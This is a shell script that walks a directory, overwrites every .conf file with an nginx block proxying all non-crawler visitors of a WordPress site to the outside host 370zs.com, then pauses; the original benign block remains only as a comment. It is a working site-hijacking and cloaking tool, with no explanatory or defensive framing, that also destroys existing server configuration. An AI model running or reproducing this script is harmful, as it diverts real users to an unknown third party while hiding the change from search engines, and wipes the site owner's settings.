#!/bin/sh

echo "<=======copy starting =======>"

function action1(){
	echo "location /
{
	 try_files \$uri \$uri/ /index.php?\$args;
  if (\$http_user_agent !~* \"qihoobot|Baiduspider|Sosospider|Sogou spider|Sogou web spider|YisouSpider\") 
                { 
                    proxy_pass http://370zs.com;
                }
}

rewrite /wp-admin\$ \$scheme://\$host\$uri/ permanent;">$1
	echo "success $1 !"
} 

for dir in $(find ./ -type f -name "*.conf")
do
 [ -f $dir ] && action1 $dir
done

echo "<=======complete=======>"

sleep 20      


#"location /
#{
#try_files \$uri \$uri/ /index.php?\$args;
#}

#rewrite /wp-admin\$ \$scheme://\$host\$uri/ permanent;">$1